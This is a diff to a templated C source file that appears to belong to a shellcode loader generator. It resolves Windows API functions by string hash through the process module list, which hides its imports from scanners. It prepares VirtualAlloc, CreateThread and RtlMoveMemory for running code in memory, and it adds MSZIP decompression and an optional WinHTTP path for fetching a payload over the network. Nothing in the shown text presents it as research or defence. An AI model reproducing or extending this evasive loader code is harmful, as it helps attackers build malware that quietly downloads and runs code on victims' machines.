@@ -1,5 +1,4 @@
-// --- Typedefs and Global Pointers ---
-typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
+// --- 1. Define Typedefs for all required function pointers ---
 typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
 typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -18,10 +17,24 @@ typedef BOOL (WINAPI *pCloseDecompressor)(DECOMPRESSOR_HANDLE);
 typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+{% if data_source == 'http' %}
+typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, const LPCWSTR *, DWORD);
+typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
+typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTSW);
+typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
+typedef BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
+{% endif %}
 
+// --- 2. Declare global variables to hold the resolved function pointers ---
+pLoadLibraryA pfnLoadLibraryA;
 pVirtualAlloc pfnVirtualAlloc;
 pCreateThread pfnCreateThread;
-pRtlMoveMemory pfnRtlMoveMemory;
 pWaitForSingleObject pfnWaitForSingleObject;
 pCloseHandle pfnCloseHandle;
 pCreateFileMappingW pfnCreateFileMappingW;
@@ -32,11 +45,25 @@ pHeapFree pfnHeapFree;
 pCreateDecompressor pfnCreateDecompressor;
 pDecompress pfnDecompress;
 pCloseDecompressor pfnCloseDecompressor;
-pLoadLibraryA pfnLoadLibraryA;
 pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
+pRtlMoveMemory pfnRtlMoveMemory;
+{% if data_source == 'http' %}
+pWinHttpOpen pfnWinHttpOpen;
+pWinHttpConnect pfnWinHttpConnect;
+pWinHttpOpenRequest pfnWinHttpOpenRequest;
+pWinHttpSendRequest pfnWinHttpSendRequest;
+pWinHttpReceiveResponse pfnWinHttpReceiveResponse;
+pWinHttpQueryDataAvailable pfnWinHttpQueryDataAvailable;
+pWinHttpReadData pfnWinHttpReadData;
+pWinHttpCloseHandle pfnWinHttpCloseHandle;
+pWinHttpCrackUrl pfnWinHttpCrackUrl;
+pWinHttpSetOption pfnWinHttpSetOption;
+pWinHttpQueryHeaders pfnWinHttpQueryHeaders;
+{% endif %}
 
+// --- 3. Hashing and Resolution Functions ---
 DWORD HashString(const char* str) {
     DWORD hash = 5381;
     int c;
@@ -67,11 +94,8 @@ HMODULE GetModuleHandleByHash(DWORD dwModuleNameHash) {
             DWORD i = 0;
             while (pDte->FullDllName.Buffer[i] && i < MAX_PATH - 1) {
                 char c = (char)pDte->FullDllName.Buffer[i];
-                if (c >= 'a' && c <= 'z') {
-                    upperDllName[i] = c - 32;
-                } else {
-                    upperDllName[i] = c;
-                }
+                if (c >= 'a' && c <= 'z') { upperDllName[i] = c - 32; } 
+                else { upperDllName[i] = c; }
                 i++;
             }
             upperDllName[i] = '\0';
@@ -112,6 +136,8 @@ void ResolveAPIs() {
     DWORD KERNEL32_HASH = {{ hash_kernel32_dll }};
     DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
     DWORD CABINET_HASH = {{ hash_cabinet_dll }};
+    DWORD WINHTTP_HASH = {{ hash_winhttp_dll }};
+
     HMODULE hKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
     HMODULE hNtdll = GetModuleHandleByHash(NTDLL_HASH);
     
@@ -133,15 +159,35 @@ void ResolveAPIs() {
         pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
     }
 
+    {% if bytecode_compression == 'mszip_compressor' %}
     HMODULE hCabinet = GetModuleHandleByHash(CABINET_HASH);
-    if (hCabinet == NULL && pfnLoadLibraryA != NULL) {
-        hCabinet = pfnLoadLibraryA("cabinet.dll");
-    } 
+    if (hCabinet == NULL && pfnLoadLibraryA != NULL) { 
+        hCabinet = pfnLoadLibraryA("cabinet.dll"); 
+    }
     if (hCabinet != NULL) {
         pfnCreateDecompressor = (pCreateDecompressor)GetProcAddressByHash(hCabinet, {{ hash_createdecompressor }});
         pfnDecompress = (pDecompress)GetProcAddressByHash(hCabinet, {{ hash_decompress }});
         pfnCloseDecompressor = (pCloseDecompressor)GetProcAddressByHash(hCabinet, {{ hash_closedecompressor }});
     }
+    {% endif %}
+
+    {% if data_source == 'http' %}
+    HMODULE hWinHttp = GetModuleHandleByHash(WINHTTP_HASH);
+    if (hWinHttp == NULL && pfnLoadLibraryA != NULL) { hWinHttp = pfnLoadLibraryA("winhttp.dll"); }
+    if (hWinHttp != NULL) {
+        pfnWinHttpOpen = (pWinHttpOpen)GetProcAddressByHash(hWinHttp, {{ hash_winhttpopen }});
+        pfnWinHttpConnect = (pWinHttpConnect)GetProcAddressByHash(hWinHttp, {{ hash_winhttpconnect }});
+        pfnWinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddressByHash(hWinHttp, {{ hash_winhttpopenrequest }});
+        pfnWinHttpSendRequest = (pWinHttpSendRequest)GetProcAddressByHash(hWinHttp, {{ hash_winhttpsendrequest }});
+        pfnWinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddressByHash(hWinHttp, {{ hash_winhttpreceiveresponse }});
+        pfnWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddressByHash(hWinHttp, {{ hash_winhttpquerydataavailable }});
+        pfnWinHttpReadData = (pWinHttpReadData)GetProcAddressByHash(hWinHttp, {{ hash_winhttpreaddata }});
+        pfnWinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddressByHash(hWinHttp, {{ hash_winhttpclosehandle }});
+        pfnWinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddressByHash(hWinHttp, {{ hash_winhttpcrackurl }});
+        pfnWinHttpSetOption = (pWinHttpSetOption)GetProcAddressByHash(hWinHttp, {{ hash_winhttpsetoption }});
+        pfnWinHttpQueryHeaders = (pWinHttpQueryHeaders)GetProcAddressByHash(hWinHttp, {{ hash_winhttpqueryheaders }});
+    }
+    {% endif %}
 
     DEBUG_PRINT("API functions resolved by hash.");
 }
